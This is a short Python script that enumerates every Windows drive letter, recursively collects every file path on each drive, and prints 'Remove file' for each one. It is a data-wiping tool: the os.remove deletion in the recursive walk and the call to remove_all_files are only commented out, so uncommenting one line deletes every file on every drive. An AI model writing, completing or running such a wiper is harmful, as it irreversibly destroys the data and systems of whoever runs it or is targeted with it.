import os
import glob

drive_letters = []
system_files_tree = []


def get_all_drives():
    for char in 'abcdefghijklmnopqrstuvwxyz':
        char.upper()

        if len(glob.glob(char.upper() + ":*")) > 0:
            drive_letters.append(char.upper())


def get_all_files():
    for drive_letter in drive_letters:
        #        system_files_tree.append(glob.glob(drive_letter + ":\*"))
        get_all_files_of_folder_recursive(drive_letter + ":")


def get_all_files_of_folder_recursive(path):
    found_files = glob.glob(path + "\*")
    system_files_tree.insert(len(system_files_tree) + 1, found_files)

    for current_file in found_files:
        get_all_files_of_folder_recursive(current_file)
        print("Remove file: " + str(current_file))
        # uncomment for faster results
        # try:
        #     os.remove(current_file)
        # except:
        #     print("Something went wrong by removing: " + current_file)


def remove_all_files():
    for position in system_files_tree:
        for path in position:
            print("Remove file: " + str(path))
            try:
                os.remove(path)
            except:
                print("Something went wrong by removing: " + path)


get_all_drives()
get_all_files()

print(drive_letters)
print(str(len(system_files_tree)) + 'Files found !')
# uncommented for security reasons
# remove_all_files()
